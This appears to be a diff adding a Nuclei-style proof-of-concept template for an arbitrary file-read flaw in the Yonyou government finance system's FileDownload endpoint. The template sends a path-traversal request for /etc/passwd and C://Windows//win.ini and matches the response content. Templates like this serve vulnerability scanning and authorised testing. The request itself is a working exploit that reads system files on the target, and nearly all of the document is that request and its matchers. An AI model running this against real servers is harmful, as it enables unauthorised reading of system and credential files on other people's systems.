@@ -1,0 +1,43 @@
+id: poc-yaml-yongyou-zhengwu-filedownload-anyfile-read
+
+info:
+  name: 用友政务财务系统 FileDownload 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 文件读取
+
+variables:
+  path:
+    - C://Windows//win.ini
+    - /etc/passwd
+
+http:
+  - raw:
+      - |
+        GET /bg/attach/FileDownload?execlPath={{path}} HTTP/1.1
+        Host: {{Hostname}}
+
+    payloads:
+      path:
+        - "C://Windows//win.ini"
+        - "/etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        condition: or
+        words:
+          - "for 16-bit app support"
+          - "root:"
+      - type: regex
+        condition: or
+        regex:
+          - "filename=C://Windows//win.ini"
+          - "filename=passwd"
+      - type: word
+        condition: or
+        words:
+          - "/bin"
